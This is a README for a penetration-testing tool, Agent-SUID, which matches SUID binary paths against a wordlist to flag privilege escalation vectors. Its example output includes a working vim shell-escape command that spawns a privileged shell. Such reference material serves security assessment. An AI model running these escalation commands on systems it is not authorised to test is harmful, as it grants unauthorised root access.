# Agent-SUID vC1.0

Agent-SUID is a C program script developed by **CyberGhoul** to assist security professionals in identifying potential privilege escalation vectors by discovering exploitable SUID binaries on a system. This tool allows users to input SUID binary paths and checks for matches against a predefined wordlist of SUID binaries to determine if the SUID binary is exploitable or not.

## Features
- **User Input:** Enter SUID binary paths one per line to check for exploitable SUID binaries.
- **Wordlist Matching:** Matches the base name of the input paths against a predefined wordlist.
- **Privilege Escalation Techniques:** Displays detailed information on potential privilege escalation techniques for matched binaries.
- **Installation & Uninstallation:** Easily install or uninstall the script to `/usr/local/bin` with superuser permissions.

## Installation

To install the script on your system:

```bash
make
sudo make install  
```
This will copy the script to `/usr/local/bin`, making it accessible from anywhere in your terminal.

## Usage

To run the script, use the following command:

```
agent-suid
```
Once running, you can input paths to be checked. Press Enter on an empty line to finish inputting paths.


## Example

```
$ agent-suid

Agent-SUID vC1.0 by CyberGhoul - the ultimate tool for discovering exploitable SUID binaries on your system. This tool is designed to help security professionals identify potential privilege escalation vectors.
        
Enter paths one per line (press Enter on an empty line to finish):

/bin/ping6
/bin/ping
/bin/mount
/bin/fusermount
/bin/umount
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/newgrp
/usr/bin/sudo
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/vmware-user-suid-wrapper
/usr/bin/passw
/bin/vim


Exploitable SUID Binaries Overview: 1 found
Details on privilege escalation techniques:

-------------------------------------------------
vim:
        sudo install -m =xs $(which vim) .
        ./vim -c ':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'
        
-------------------------------------------------
```
## Uninstallation
To uninstall the script from your system :
```
sudo make uninstall
```

## Requirements

- Superuser permissions (for installation/uninstallation)

## License

This project is licensed under the MIT License - see the [LICENSE](https://github.com/cyb3rgh0u1/Agent-SUID/blob/main/LICENSE) file for details.
